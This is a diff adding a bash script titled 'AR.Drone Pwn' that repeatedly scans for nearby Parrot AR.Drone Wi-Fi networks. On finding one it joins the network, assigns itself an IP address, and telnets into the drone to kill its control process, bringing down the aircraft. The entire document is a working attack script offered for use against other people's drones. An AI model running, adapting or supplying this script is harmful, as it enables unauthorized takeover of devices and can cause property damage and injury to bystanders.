@@ -1,0 +1,66 @@
+#!/bin/bash
+
+IFACE=$1
+INTERVAL=$2
+
+if [ -n "$IFACE" ]; then
+	echo "Using Interface: $IFACE"
+else
+	echo "AR.Drone Pwn script version 1.0 by Darren Kitchen"
+	echo "Usage: ardronepwn <interface> <interval in seconds>"
+	echo ""
+	exit
+fi
+
+if [ -n "$INTERVAL" ]; then
+	if [ "$INTERVAL" -lt 30 ]; then
+		echo "Using minimum interval: 30 seconds"
+		INTERVAL=30
+	else
+		echo "Using Interval: $INTERVAL seconds"
+	fi
+else
+	echo "Using default Interval: 60 seconds"
+	INTERVAL=60
+fi
+
+
+
+while true; do
+if ! ( iw $IFACE scan | grep SSID | awk '{print $2}' | grep [a]rdrone ); then
+echo "No Drones Found"
+else
+echo "Drone Found! Attempting to connect"
+DRONESSID=`iw $IFACE scan | grep SSID | awk '{print $2}' | grep [a]rdrone`
+iwconfig $IFACE essid $DRONESSID
+sleep 2
+
+echo "Testing Wireless Association"
+if ! ( iwconfig $IFACE | grep $DRONESSID ); then
+echo "Association to $DRONESSID failed"
+else
+echo "Association to $DRONESSID successful"
+
+echo "Setting Static IP Address"
+ifconfig $IFACE 192.168.1.5 netmask 255.255.255.0 up
+sleep 2
+
+echo "Testing IP Connection"
+if ! ( ping -c1 192.168.1.1 | grep from ); then
+echo "IP Connection Failed"
+else
+echo "IP Connection Successful"
+echo "Connecting to Telnet and sending kill command. Banzai!"
+empty -f -i /tmp/drone_input.fifo -o /tmp/drone_output.fifo -p /tmp/drone_empty.pid telnet 192.168.1.1
+empty -w -i /tmp/drone_output.fifo -o /tmp/drone_input.fifo BusyBox "kill -KILL `pidof program.elf`n"
+kill `pidof empty`
+echo ""
+echo "Kill command sent. Splash one drone"
+echo ""
+
+fi
+fi
+fi
+
+sleep $INTERVAL
+done
